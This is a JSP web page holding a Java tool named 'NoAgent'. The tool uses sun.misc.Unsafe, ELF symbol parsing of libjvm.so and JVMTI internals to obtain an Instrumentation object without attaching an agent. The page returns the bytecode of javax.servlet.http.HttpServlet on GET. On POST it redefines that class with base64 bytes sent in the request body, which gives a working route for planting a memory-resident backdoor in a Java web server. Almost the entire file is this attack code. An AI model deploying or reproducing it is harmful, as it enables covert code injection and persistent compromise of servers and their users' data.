<%@ page import="java.io.BufferedReader,java.io.FileReader,java.io.IOException,java.io.RandomAccessFile,java.lang.instrument.ClassDefinition,java.lang.instrument.ClassFileTransformer,java.lang.instrument.IllegalClassFormatException,java.lang.instrument.Instrumentation,java.lang.reflect.Field,java.security.ProtectionDomain,java.util.Base64,java.util.HashMap,java.util.Map,java.util.regex.Pattern,sun.misc.Unsafe,java.io.*,java.net.*" %>

<%!
public class NoAgent
{
    private Unsafe unsafe;
    private int addressSize;
    private long arrayBaseOffset;
    private String jvmPath;
    private long jvmBaseAddr;
    private String javaVersion;
    private HashMap<String, Long> symbols;
    private Class targetClass;
    private byte[] newClassData;

    public NoAgent(Class c, String newClassData){
        this.targetClass = c;
        this.newClassData = Base64.getDecoder().decode(newClassData);
    }

    public void setNewClassData(String newClassData){
        this.newClassData = Base64.getDecoder().decode(newClassData);
    }

    public long find_symbol(String pattern){
        for(Map.Entry<String, Long> entry: symbols.entrySet()){
            if (Pattern.matches(pattern, entry.getKey())){
                return entry.getValue();
            }
        }

        return 0;
    }

    public HashMap<String, Long> load_symbols(String elfpath) {
        HashMap<String, Long> s = new HashMap();

        RandomAccessFile fin = null;
        try{
            fin = new RandomAccessFile(elfpath, "r");
            byte[] e_ident = new byte[16];
            fin.read(e_ident);
            Short.reverseBytes(fin.readShort());
            Short.reverseBytes(fin.readShort());
            Integer.reverseBytes(fin.readInt());
            Long.reverseBytes(fin.readLong());
            Long.reverseBytes(fin.readLong());
            long e_shoff = Long.reverseBytes(fin.readLong());
            Integer.reverseBytes(fin.readInt());
            Short.reverseBytes(fin.readShort());
            Short.reverseBytes(fin.readShort());
            Short.reverseBytes(fin.readShort());
            int e_shentsize = Short.reverseBytes(fin.readShort());
            int e_shnum = Short.reverseBytes(fin.readShort());
            Short.reverseBytes(fin.readShort());
            long sh_offset = 0;
            long sh_size = 0;
            int sh_link = 0;
            long sh_entsize = 0;
            for (int i = 0; i < e_shnum; i++) {
                fin.seek(e_shoff + (i * 64));
                Integer.reverseBytes(fin.readInt());
                int sh_type = Integer.reverseBytes(fin.readInt());
                Long.reverseBytes(fin.readLong());
                Long.reverseBytes(fin.readLong());
                sh_offset = Long.reverseBytes(fin.readLong());
                sh_size = Long.reverseBytes(fin.readLong());
                sh_link = Integer.reverseBytes(fin.readInt());
                Integer.reverseBytes(fin.readInt());
                Long.reverseBytes(fin.readLong());
                sh_entsize = Long.reverseBytes(fin.readLong());
                if (sh_type == 2) {
                    break;
                }
            }
            int symtab_shdr_sh_link = sh_link;
            long symtab_shdr_sh_size = sh_size;
            long symtab_shdr_sh_entsize = sh_entsize;
            long symtab_shdr_sh_offset = sh_offset;
            fin.seek(e_shoff + (symtab_shdr_sh_link * e_shentsize));
            Integer.reverseBytes(fin.readInt());
            Integer.reverseBytes(fin.readInt());
            Long.reverseBytes(fin.readLong());
            Long.reverseBytes(fin.readLong());
            long sh_offset2 = Long.reverseBytes(fin.readLong());
            Long.reverseBytes(fin.readLong());
            Integer.reverseBytes(fin.readInt());
            Integer.reverseBytes(fin.readInt());
            Long.reverseBytes(fin.readLong());
            Long.reverseBytes(fin.readLong());
            long cnt = symtab_shdr_sh_entsize > 0 ? symtab_shdr_sh_size / symtab_shdr_sh_entsize : 0L;
            long j = 0;
            while (true) {
                long i2 = j;
                if (i2 >= cnt) {
                    break;
                }

                fin.seek(symtab_shdr_sh_offset + (symtab_shdr_sh_entsize * i2));
                int st_name = Integer.reverseBytes(fin.readInt());
                byte st_info = fin.readByte();
                fin.readByte();
                Short.reverseBytes(fin.readShort());
                long st_value = Long.reverseBytes(fin.readLong()); // error
                // long st_value = fin.readLong();
                Long.reverseBytes(fin.readLong());
                if (st_value != 0 && st_name != 0) {
                    fin.seek(sh_offset2 + st_name);
                    String name = "";
                    while (true) {
                        byte ch = fin.readByte();
                        if (ch == 0) {
                            break;
                        }
                        name = name + ((char) ch);
                    }
                    // System.out.printf("=============> %s 0x%x 0x%x\n", name, st_name, st_value);
                    s.put(name, st_value);
                }
                j = i2 + 1;
            }
        }catch(Exception e){
            e.printStackTrace();
        }finally {
            if (fin != null){
                try{
                    fin.close();
                }catch(Exception e){
                    e.printStackTrace();
                }
            }
        }

        return s;
    }


    public HashMap getModuleInfo(String moduleName) throws IOException {
        HashMap m = new HashMap();
        // The path of the maps file
        String mapsPath = "/proc/self/maps";
        // A buffered reader to read the file line by line
        BufferedReader reader = new BufferedReader(new FileReader(mapsPath));
        // A variable to store the base address
        long baseAddress = 0;
        // A loop to read each line of the file
        while (true) {
            // Read a line from the file
            String line = reader.readLine();
            // If the line is null, break the loop
            if (line == null) {
                break;
            }
            line = line.trim();
            // If the line contains the module name, parse the base address
            if (line.contains(moduleName)) {
                System.out.println(line);
                // Split the line by whitespace
                String[] parts = line.split("\\s+");
                // The first part is the address range, split it by dash
                String[] range = parts[0].split("-");
                // The first part of the range is the base address, parse it as a hexadecimal long
                baseAddress = Long.parseLong(range[0], 16);
                m.put("base_addr", baseAddress);
                m.put("path", parts[parts.length-1]);
                // Break the loop
                break;
            }
        }
        // Close the reader
        reader.close();

        // Return the base address
        return m;
    }

    private Unsafe reflectGetUnsafe() {
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            return (Unsafe) field.get(null);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private long getObjectAddress(Object object) {
        Object[] objects = new Object[] { object };
        
        return unsafe.getLong(objects, arrayBaseOffset);
    }

    private Object getObject(long address) {
        Object[] objects = new Object[1];

        unsafe.putLong(objects, arrayBaseOffset, address);

        return objects[0];
    }

    private Instrumentation fetchLastInstImpl() throws Exception {
        // _ZN12JvmtiEnvBase17_head_environmentE
        long headEnvOffset = find_symbol(".*_head_environment.*");
        if (headEnvOffset == 0){
            System.out.println("not found the symbol: _head_environment");
            return null;
        }
        int ptrSize = addressSize;

        long pJvmtiEnv = headEnvOffset + jvmBaseAddr;

        long jvmtiEnv = unsafe.getLong(pJvmtiEnv); // jvmtiEnv type: JvmtiEnv*

        if (jvmtiEnv == 0){ // none
            return null;
        }

        //  jint _magic;    // JVMTI_MAGIC: 0x71EE, DISPOSED_MAGIC: 0xDEFC
        //  jint _version;  // version value passed to JNI GetEnv()
        //  JvmtiEnvBase* _next;
        long next_offset = 0; // find _next offset by JVMTI_MAGIC
        for(int i = 1; i <= 4; i++){
            long test = unsafe.getLong(jvmtiEnv + i * ptrSize);
            // System.out.printf("test: 0x%x 0x%x\n", test, test & 0xffff);
            if ((test & 0xffff) == 0x71ee || (test & 0xffff) == 0xDEFC){
                next_offset = i + 1;
                break;
            }
        }

        if (next_offset == 0){
            System.out.println("not found the _next offset in jvmtiEnv");
            return null;
        }
        
        while (true) {
            System.out.printf("found jvmtiEnv addr: 0x%x, the _next offset is %d\n", jvmtiEnv, next_offset);
            long nextJvmtiEnvAddr = unsafe.getLong(jvmtiEnv + next_offset * ptrSize); // ._next
            if (nextJvmtiEnvAddr == 0) {
                break;
            }
            jvmtiEnv = nextJvmtiEnvAddr;
        }
        System.out.printf("the last jvmtiEnv addr: 0x%x\n", jvmtiEnv);

        long envLocalStorage = unsafe.getLong(jvmtiEnv + (next_offset + 2) * ptrSize); // ._env_local_storage, type: _JPLISEnvironment*
        if (envLocalStorage == 0){
            System.out.println("_env_local_storage is 0");
            System.out.printf("env + 1: 0x%x\n", unsafe.getLong(jvmtiEnv + 1 * ptrSize));
            System.out.printf("env + 2: 0x%x\n", unsafe.getLong(jvmtiEnv + 2 * ptrSize));
            System.out.printf("env + 3: 0x%x\n", unsafe.getLong(jvmtiEnv + 3 * ptrSize));
            System.out.printf("env + 4: 0x%x\n", unsafe.getLong(jvmtiEnv + 4 * ptrSize));
            System.out.printf("env + 6: 0x%x\n", unsafe.getLong(jvmtiEnv + 6 * ptrSize));
            return null;
        }

        System.out.printf("envLocalStorage addr: 0x%x\n", envLocalStorage);
        
        long agent = unsafe.getLong(envLocalStorage + ptrSize); // *(_JPLSEnvironment.mAgent)
        System.out.printf("agent addr: 0x%x\n", agent);
        long instImpl = unsafe.getLong(agent + 7 * ptrSize); // instImpl jobject
        System.out.printf("instImpl addr: 0x%x\n", instImpl);
        long objAddr = unsafe.getLong(instImpl);
        System.out.printf("obj addr: 0x%x\n", objAddr);

        Object obj = getObject(objAddr);
        if (obj instanceof Instrumentation){
            return (Instrumentation)obj;
        }
        System.out.println("the last instrumentation is not instance of Instrumentation: " + obj.getClass());

        return null;
    }
    
    public void hack() throws Exception
    {
        // 这里简单处理一下，直接拿最后一个实例
        Instrumentation instrumentation = fetchLastInstImpl();

        if (instrumentation == null){
            System.out.println("[NoAgent] not found the last Instrumentation");
            return;
        }

        System.out.printf("[NoAgent] found the last Instrumention, addr is: 0x%x\n", getObjectAddress(instrumentation));

        if (instrumentation.isRetransformClassesSupported()){
            System.out.println("[NoAgent] will retransform the class: " + targetClass.getName());
            String matcher = this.targetClass.getName().replace(".", "/");

            instrumentation.addTransformer(new ClassFileTransformer() {
                @Override
                public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                        ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                    if (matcher.equals(className)){
                        System.out.println("[NoAgent] will hook class ======================> " + className);
                        return newClassData;
                    }
                    
                    return null;
                }
            }, true);
            instrumentation.retransformClasses(this.targetClass);
        }else if (instrumentation.isRedefineClassesSupported()){
            System.out.println("[NoAgent] will redefine the class: " + this.targetClass.getName());
            instrumentation.redefineClasses(new ClassDefinition[]{
                new ClassDefinition(this.targetClass, newClassData)
            });
        }else {
            System.out.println("[NoAgent] the last Instrumentation cannot be used");
        }
    }

    public byte[] readInputStream(InputStream is) throws IOException {
        // 创建一个字节数组输出流，用于缓存输入流中的数据
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        // 定义一个字节数组，用于存储每次读取的字节
        byte[] data = new byte[1024];
        // 定义一个整数变量，用于记录每次读取的字节数
        int nRead;
        // 循环读取输入流中的数据，直到读取完毕
        while ((nRead = is.read(data, 0, data.length)) != -1) {
            // 将读取的字节写入字节数组输出流中
            buffer.write(data, 0, nRead);
        }
        // 刷新字节数组输出流
        buffer.flush();
        // 返回字节数组输出流中的字节数组
        return buffer.toByteArray();
    }


    public void start(){
        unsafe = reflectGetUnsafe();
        addressSize = unsafe.addressSize();
        arrayBaseOffset = unsafe.arrayBaseOffset(Object[].class);
        javaVersion = System.getProperty("java.version");

        try {
            HashMap m = getModuleInfo("libjvm.so");
            jvmPath = (String)m.get("path");
            jvmBaseAddr = (long)m.get("base_addr");
        }catch(Exception e){
            e.printStackTrace();
        }
        System.out.println("Address Size: " + addressSize);
        System.out.println("Array Base Offset: " + arrayBaseOffset);
        System.out.println("jvm path: " + jvmPath);
        System.out.println("jvm base addr: " + jvmBaseAddr);
        System.out.println("java version: " + javaVersion);
        symbols = load_symbols(jvmPath);
        
        try {
            hack();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
%>

<% 
    try {
        String method = request.getMethod ();

        Class c = Class.forName("javax.servlet.http.HttpServlet");
        NoAgent noAgent = (NoAgent)application.getAttribute("noAgent");
        if (noAgent == null){
            noAgent = new NoAgent(c, "");
            application.setAttribute("noAgent", noAgent);
        }

        if (method.equalsIgnoreCase("post")){ // 更新类字节码
            String body = request.getReader ().readLine ();
            noAgent.setNewClassData(body);
            noAgent.start();
            
            out.println(body);
        }else{// 返回本地类字节码
            InputStream is = c.getClassLoader().getResourceAsStream(c.getName().replace(".", "/") + ".class");
            byte[] bs = noAgent.readInputStream(is);
            is.close();
            String data = Base64.getEncoder().encodeToString(bs);
            out.println(data);
        }
    }catch(Exception e){
        e.printStackTrace();
    }
%>